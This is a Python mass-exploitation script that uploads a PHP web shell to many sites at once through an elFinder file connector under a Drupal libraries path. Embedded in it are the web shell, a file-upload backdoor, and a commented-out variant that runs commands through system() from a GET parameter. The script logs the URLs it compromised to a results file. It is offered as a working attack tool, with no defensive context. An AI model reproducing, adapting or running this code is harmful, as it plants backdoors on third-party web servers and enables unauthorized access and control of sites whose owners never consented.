import urllib3, time, sys, requests
from time import time as timer
from multiprocessing.dummy import Pool as ThreadPool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
try:
    with open(sys.argv[1], 'r') as f:
        woh = f.read().splitlines()
except IOError:
    pass
woh = list((woh))
print("Coded By Kro0oz #https://github.com/kro0oz ")
#shell = """<?php echo "Kro0oz </br>"; $cmd = $_GET['cmd']; system($cmd);?>"""
shell = """<?php 
echo "By Kro0oz #https://github.com/kro0oz"." ".hex2bin("")."<br>";
echo '<form method="post" enctype="multipart/form-data"><input type="file" name="___upload" /><input type="submit" name="_upl" /></form>';
if(isset($_POST['_upl'])){
    if(copy($_FILES['___upload']['tmp_name'],$_FILES['___upload']['name'])){
        echo '<b>Upload !!!</b><br><br>';
    }else{
        echo '<b>Fail</b><br><br>';
    }
}
?>"""
def git_response(url):
	
	try:
		filename = "upkrz.php"
		Agent = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
		data = {'cmd':'upload','current':'8ea8853cb93f2f9781e0bf6e857015ea'}
		files = {'upload[]':(filename,shell,'Content-Type: application/octet-stream')}
		response = requests.post(url + "/sites/all/libraries/elfinder/connectors/php/connector.php", data=data,files=files)
		checks = requests.get(url +"/sites/all/libraries/elfinder/files/upkrz.php")
		if '' in checks.content:
			print("[Target] {} Success ").format(url)
			open('Suc_shell.txt', 'a').write(url +"/sites/all/libraries/elfinder/files/upkrz.php\n")
		else:
			print("[Target]: {} Failed  ").format(url)
		
	except:
		pass

def Main():
    try:
        start = timer()
        pp = ThreadPool(40)
        pr = pp.map(git_response, woh)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
